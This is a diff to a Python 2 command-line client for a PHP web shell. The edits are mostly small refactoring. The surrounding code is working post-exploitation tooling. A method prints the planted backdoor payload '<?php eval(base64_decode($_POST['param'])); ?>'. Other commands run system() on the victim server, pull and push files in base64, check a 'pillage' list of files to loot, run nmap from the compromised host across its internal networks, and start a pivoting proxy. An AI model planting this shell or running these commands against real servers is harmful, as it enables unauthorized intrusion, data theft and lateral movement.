@@ -57,7 +57,7 @@ class rshell(Cmd):
             "cmd_to_send": "You can write a command to be runned in the server",
             "!cmd_local": "If the command starts with ! it run locally",
         }
-        #for k, v in help_string.items():
+        # for k, v in help_string.items():
         #    print "\t{0:<20}: {1:<50}".format(k, v)
 
         return None
@@ -69,8 +69,8 @@ class rshell(Cmd):
         the command to execute
         :param line: php command to execute using system function
         """
-        cmd = "system('{0}');".format(line)
-        #doing the request to the server
+        cmd = "system('{0} 2>&1');".format(line)
+        # doing the request to the server
         (code, response) = self.dorequest(cmd)
         if code == 200:
             print response
@@ -104,7 +104,7 @@ class rshell(Cmd):
         return True
 
     def dorequest(self, php_cmd):
-        #Post request using the param parameter
+        # Post request using the param parameter
         """
         Make a request to the server sending the php code
         :param php_cmd: php code to execute on the server
@@ -148,7 +148,8 @@ class rshell(Cmd):
             print "Error"
         return None
 
-    def print_payload(self):
+    @staticmethod
+    def print_payload():
         print "<?php eval(base64_decode($_POST['param'])); ?>"
 
     def do_download(self, line):
@@ -156,12 +157,12 @@ class rshell(Cmd):
         Download a file from the server
         usage: download remote_path/remote_file local_path/local_file"""
         files = line.split()
-        #Return file contents encoded in base 64
+        # Return file contents encoded in base 64
         cmd = "echo base64_encode(file_get_contents('{0}'));".format(files[0])
         (code, data) = self.dorequest(cmd)
         if code == 200:
             f = file(os.path.basename(files[0]), "w")
-            #Decode data and write it in a file
+            # Decode data and write it in a file
             f.write(base64.decodestring(data))
             f.close()
         else:
@@ -175,10 +176,10 @@ class rshell(Cmd):
         (filename, destination) = line.split()
         f = file(filename)
         f_name = os.path.basename(filename)
-        #Encode file data in base 64
+        # Encode file data in base 64
         data = base64.encodestring(f.read()).replace("\n", "")
         f.close()
-        #Building the command in remote server to decode base 64
+        # Building the command in remote server to decode base 64
         # and write the data in the file
         cmd = "file_put_contents('{0}/{1}',base64_decode('{2}'));"
         (code, data) = self.dorequest(cmd.format(destination, f_name, data))
@@ -263,7 +264,7 @@ class rshell(Cmd):
         usage: check_files"""
         file_list = file("pillage.lst")
         for filename in file_list:
-            #Check filename, [:-1] to remove eol from readline
+            # Check filename, [:-1] to remove eol from readline
             self.file_exists(filename[:-1])
         file_list.close()
         return None
@@ -305,7 +306,7 @@ class rshell(Cmd):
             for ip, info in self.ips.items():
                 if not ip.startswith("127."):
                     cmd += "{0}/{1} ".format(ip, info["mask_bits"])
-            #cmd = "nmap 127.0.0.1"
+            # cmd = "nmap 127.0.0.1"
             (code, response) = self.dorequest("system('{0}');".format(cmd))
             if code == 200:
                 scans = response.split("Nmap scan report for ")[1:]
@@ -350,6 +351,8 @@ class rshell(Cmd):
         usage: start_proxy"""
         if not self.proxy_object:
             self.proxy_object = proxy.Proxy()
+            if line == "debug":
+                self.proxy_object.set_debug(1)
             print "Starting proxy on {1}:{0}".format(self.proxy_object.port,
                                                      self.proxy_object.host)
             self.proxy_object.set_shell_url(self.shell_url)
@@ -368,16 +371,16 @@ class rshell(Cmd):
             self.proxy_object.join()
             self.proxy_object = None
 
-    def do_set_password(self, line):
-        """
-        Set shell password"""
-        a = sha512(line)
-        print a.hexdigest()
+    # def do_set_password(self, line):
+    #     """
+    #     Set shell password"""
+    #     a = sha512(line)
+    #     print a.hexdigest()
 
-    def do_sql_connect(self, line):
-        """
-        MySQL Connection"""
-        print line
+    # def do_sql_connect(self, line):
+    #     """
+    #     MySQL Connection"""
+    #     print line
 
     def do_get_os(self, line):
         """
